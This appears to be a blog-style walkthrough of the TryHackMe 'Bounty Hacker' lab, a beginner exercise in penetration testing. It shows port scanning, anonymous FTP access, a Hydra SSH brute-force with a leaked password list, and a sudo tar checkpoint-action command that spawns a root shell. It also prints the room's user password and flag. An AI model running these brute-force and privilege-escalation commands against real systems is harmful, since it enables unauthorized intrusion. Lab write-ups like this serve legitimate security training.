---
description: May 18, 2025 - Xploit0x90
icon: flag
---

# Bounty Hacker

<figure><img src="../.gitbook/assets/1,286 (1)qweqwe.png" alt=""><figcaption></figcaption></figure>

* Difficulty : <mark style="color:green;">Easy</mark>
* Link : [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)
* Creator : [Sevuhl](https://tryhackme.com/p/Sevuhl)

**Bounty Hacker** is a beginner-friendly Linux machine focused on practicing classic techniques like service enumeration, brute-force attacks, SSH exploitation, and privilege escalation via misconfigured binaries. This room helps solidify foundational skills that are applicable in real-world penetration testing scenarios.

***

### 🚀 Deploy the Machine

I joined the [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) room and deployed the target VM. Once the machine was running, I took note of the IP address:

```
10.10.128.176
```

***

### 🔍 Enumeration

I began with a full port scan using `nmap` to identify any open TCP ports on the system:

```bash
nmap -p- 10.10.128.176 --open
```

#### ➤ Explanation:

* `-p-`: Scans all 65535 TCP ports.
* `--open`: Shows only ports that are open.

**Discovered open ports:**

* **21** - FTP
* **22** - SSH
* **80** - HTTP

<div align="left"><figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure></div>

***

I then performed a targeted scan for these ports to get additional details:

```bash
nmap -p 21,22,80 -sC -sV 10.10.128.176
```

#### ➤ Explanation:

* `-sC`: Runs Nmap’s default scripts.
* `-sV`: Attempts to detect service versions.
* `-p`: Scans specific ports.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

***

### 🌐 Web Enumeration (Port 80)

Accessing the website:

```
http://10.10.128.176
```

The website was a basic HTML page containing messages referring to a hacker group. There wasn’t any login functionality or hidden directories visible.

***

### 📁 FTP Access (Port 21)

I tried logging in with anonymous FTP because the Nmap scan showed that the FTP service was open and might allow anonymous access.

```bash
ftp 10.10.128.176
```

Used credentials:

```
Username: anonymous
Password: [press Enter]
```

Login was successful.

#### ➤ Found two files:

* `task.txt`
* `locks.txt`

I downloaded both files using:

```bash
get task.txt
get locks.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Note: This is not the complete list of passwords.</p></figcaption></figure></div>

<div align="left"><figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure></div>

⚠️ **Note:** Using `less` inside the FTP shell didn’t display the full contents of the file. That’s why it’s **always better to use `get` to download the file to your local machine**, then open it with tools like `cat`, `nano`, or `less` **locally** to ensure you see everything.

***

### 📄 File Inspection

#### `task.txt`:

This file contained a short to-do list, signed by someone named **lin**.

{% hint style="info" %}
📌 **TryHackMe Question 1 :**\
&#xNAN;**❓ Who wrote the task list?**\
✅ **Answer:** `lin`
{% endhint %}

#### `locks.txt`:

This file contained a long list of possible passwords — possibly for brute-forcing access to some other service.

{% hint style="info" %}
📌 **TryHackMe Question 2 :**\
&#xNAN;**❓ What service can you bruteforce with the text file found?**\
✅ **Answer:** `SSH`
{% endhint %}

***

### 🔓 Brute-force SSH (Port 22)

Using the possible username `lin` (from task.txt), I attempted to brute-force SSH using `hydra` and the password list from `locks.txt`.

```bash
hydra -l lin -P locks.txt ssh://10.10.128.176
```

#### ➤ Explanation:

* `-l lin`: Sets the username to `lin`.
* `-P locks.txt`: Loads password candidates from the list.
* `ssh://`: Targets the SSH protocol.

✅ **Hydra Output:**

```
[22][ssh] host: 10.10.128.176   login: lin   password: RedDr4gonSynd1cat3
```

{% hint style="info" %}
📌 **TryHackMe Question 3 :**\
&#xNAN;**❓ What is the user’s password?**\
✅ **Answer:** `RedDr4gonSynd1cat3`
{% endhint %}

<div align="left"><figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure></div>

***

### 🔑 Gaining Access via SSH

I used the discovered credentials to log in via SSH:

```bash
ssh lin@10.10.128.176
```

After logging in, I listed the contents of the home directory and found a flag file:

```bash
cat user.txt
```

{% hint style="info" %}
📌 **TryHackMe Question 4 :**\
&#xNAN;**❓ user.txt**\
✅ **Answer:** `THM{CR1M3_SyNd1C4T3}`&#x20;
{% endhint %}

<div align="left"><figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure></div>

***

### 🧱 Privilege Escalation

To see what commands I could run as `sudo`, I executed:

```bash
sudo -l
```

The output showed:

```
User lin may run the following commands on this host:
    (root) /bin/tar
```

This means I could run the `tar` command with **root privileges** without a password.

***

### 📦 Exploiting tar with GTFOBins

I visited [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) and found a known method to escalate privileges using `tar`.

I used the following command to spawn a root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### ➤ Explanation:

* `--checkpoint`: Defines after how many files the action is triggered.
* `--checkpoint-action`: Executes the given command (in this case, a shell).

I verified the shell:

```bash
whoami
root
```

Navigated to the root user’s directory:

```bash
cd /root
ls
cat root.txt
```

{% hint style="info" %}
📌 **TryHackMe Question 5 :**\
&#xNAN;**❓ root.txt**\
✅ **Answer:** `XXXXXXXXXXXXXXXX`&#x20;
{% endhint %}

<div align="left"><figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure></div>

***

### 💡 Lessons Learned

* FTP servers with anonymous access can expose sensitive files.
* Always check file contents — even simple text files can provide usernames or passwords.
* Hydra is a powerful tool for brute-forcing services when you have good input lists.
* Always check `sudo -l` to find potential privilege escalation vectors.
* [GTFOBins](https://gtfobins.github.io/) is a goldmine for exploiting misconfigured binaries that have sudo privileges.
